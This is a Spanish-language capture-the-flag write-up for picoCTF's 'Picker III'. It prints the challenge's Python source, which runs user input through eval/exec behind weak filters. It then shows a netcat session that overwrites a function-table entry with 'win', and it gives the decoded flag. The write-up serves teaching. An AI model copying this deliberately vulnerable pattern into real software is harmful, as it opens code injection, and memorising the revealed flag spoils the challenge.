## Objetivo
Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 60405`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/524/picker-III.py).
## Solución
```bash
kali@KaliEND:~/Downloads/PicoCTF/Act22/picker3$ wget https://ar  
tifacts.picoctf.net/c/524/picker-III.py  
--2024-10-30 11:09:14--  https://artifacts.picoctf.net/c/524/pi  
cker-III.py  
Resolviendo artifacts.picoctf.net (artifacts.picoctf.net)... 3.  
161.55.64, 3.161.55.26, 3.161.55.61, ...  
Conectando con artifacts.picoctf.net (artifacts.picoctf.net)[3.  
161.55.64]:443... conectado.  
Petición HTTP enviada, esperando respuesta... 200 OK  
Longitud: 4439 (4,3K) [application/octet-stream]  
Grabando a: «picker-III.py»  
  
picker-III.py                    100%[=========================  
===============================>]   4,33K  --.-KB/s    en 0s      
  
2024-10-30 11:09:29 (74,5 MB/s) - «picker-III.py» guardado [443  
9/4439]  
  
kali@KaliEND:~/Downloads/PicoCTF/Act22/picker3$ ls  
picker-III.py  
kali@KaliEND:~/Downloads/PicoCTF/Act22/picker3$ nano picker-III  
.py
```
py:
```bash
import re  
  
  
  
USER_ALIVE = True  
FUNC_TABLE_SIZE = 4  
FUNC_TABLE_ENTRY_SIZE = 32  
CORRUPT_MESSAGE = 'Table corrupted. Try entering \'reset\' to f  
ix it'  
  
func_table = ''  
  
def reset_table():  
 global func_table  
  
 # This table is formatted for easier viewing, but it is reall  
y one line  
 func_table = \  
'''\  
print_table                     \  
read_variable                   \  
write_variable                  \  
getRandomNumber                 \  
'''  
  
def check_table():  
 global func_table  
  
 if( len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZ  
E):  
   return False  
  
 return True  
  
  
def get_func(n):  
 global func_table  
  
 # Check table for viability  
 if( not check_table() ):  
   print(CORRUPT_MESSAGE)  
   return  
  
 # Get function name from table  
 func_name = ''  
 func_name_offset = n * FUNC_TABLE_ENTRY_SIZE  
 for i in range(func_name_offset, func_name_offset+FUNC_TABLE_  
ENTRY_SIZE):  
   if( func_table[i] == ' '):  
     func_name = func_table[func_name_offset:i]  
     break  
  
 if( func_name == '' ):  
   func_name = func_table[func_name_offset:func_name_offset+FU  
NC_TABLE_ENTRY_SIZE]  
    
 return func_name  
  
  
def print_table():  
 # Check table for viability  
 if( not check_table() ):  
   print(CORRUPT_MESSAGE)  
   return  
  
 for i in range(0, FUNC_TABLE_SIZE):  
   j = i + 1  
   print(str(j)+': ' + get_func(i))  
  
  
def filter_var_name(var_name):  
 r = re.search('^[a-zA-Z_][a-zA-Z_0-9]*$', var_name)  
 if r:  
   return True  
 else:  
   return False  
  
  
def read_variable():  
 var_name = input('Please enter variable name to read: ')  
 if( filter_var_name(var_name) ):  
   eval('print('+var_name+')')  
 else:  
   print('Illegal variable name')  
  
  
def filter_value(value):  
 if ';' in value or '(' in value or ')' in value:  
   return False  
 else:  
   return True  
  
  
def write_variable():  
 var_name = input('Please enter variable name to write: ')  
 if( filter_var_name(var_name) ):  
   value = input('Please enter new value of variable: ')  
   if( filter_value(value) ):  
     exec('global '+var_name+'; '+var_name+' = '+value)  
   else:  
     print('Illegal value')  
 else:  
   print('Illegal variable name')  
  
  
def call_func(n):  
 """  
 Calls the nth function in the function table.  
 Arguments:  
   n: The function to call. The first function is 0.  
 """  
  
 # Check table for viability  
 if( not check_table() ):  
   print(CORRUPT_MESSAGE)  
   return  
  
 # Check n  
 if( n < 0 ):  
   print('n cannot be less than 0. Aborting...')  
   return  
 elif( n >= FUNC_TABLE_SIZE ):  
   print('n cannot be greater than or equal to the function ta  
ble size of '+FUNC_TABLE_SIZE)  
   return  
  
 # Get function name from table  
 func_name = get_func(n)  
  
 # Run the function  
 eval(func_name+'()')  
  
  
def dummy_func1():  
 print('in dummy_func1')  
  
def dummy_func2():  
 print('in dummy_func2')  
  
def dummy_func3():  
 print('in dummy_func3')  
  
def dummy_func4():  
 print('in dummy_func4')  
  
def getRandomNumber():  
 print(4)  # Chosen by fair die roll.  
           # Guaranteed to be random.  
           # (See XKCD)  
  
def win():  
 # This line will not work locally unless you create your own  
'flag.txt' in  
 #   the same directory as this script  
 flag = open('flag.txt', 'r').read()  
 #flag = flag[:-1]  
 flag = flag.strip()  
 str_flag = ''  
 for c in flag:  
   str_flag += str(hex(ord(c))) + ' '  
 print(str_flag)  
  
def help_text():  
 print(  
 '''  
This program fixes vulnerabilities in its predecessor by limiti  
ng what  
functions can be called to a table of predefined functions. Thi  
s still puts  
the user in charge, but prevents them from calling undesirable  
subroutines.  
  
* Enter 'quit' to quit the program.  
* Enter 'help' for this text.  
* Enter 'reset' to reset the table.  
* Enter '1' to execute the first function in the table.  
* Enter '2' to execute the second function in the table.  
* Enter '3' to execute the third function in the table.  
* Enter '4' to execute the fourth function in the table.  
  
Here's the current table:  
 '''  
 )  
 print_table()  
  
  
  
reset_table()  
  
while(USER_ALIVE):  
 choice = input('==> ')  
 if( choice == 'quit' or choice == 'exit' or choice == 'q' ):  
   USER_ALIVE = False  
 elif( choice == 'help' or choice == '?' ):  
   help_text()  
 elif( choice == 'reset' ):  
   reset_table()  
 elif( choice == '1' ):  
   call_func(0)  
 elif( choice == '2' ):  
   call_func(1)  
 elif( choice == '3' ):  
   call_func(2)  
 elif( choice == '4' ):  
   call_func(3)  
 else:  
   print('Did not understand "'+choice+'" Have you tried "help  
"?')
```
.
```bash
kali@KaliEND:~/Downloads/PicoCTF/Act22/picker3$ nc saturn.picoc  
tf.net 60405  
==> 3  
Please enter variable name to write: getRandomNumber  
Please enter new value of variable: win  
==> 4  
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5  
f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0  
x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35  
0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x63 0x  
32 0x30 0x66 0x35 0x32 0x32 0x32 0x7d    
==>
```
## Notas Adicionales
Cambiamos la funcion 4 getRandomNumber por la funcion win, y luego ejecutamos la funcion 4 "win"
y el codigo que nos da lo mandamos a cyerchef y obtenemos la flag:
`picoCTF{7h1515_wh47_w3_g 37_w17h_u53r5_1n_ch4rg3_c20f5222}`
### Referencias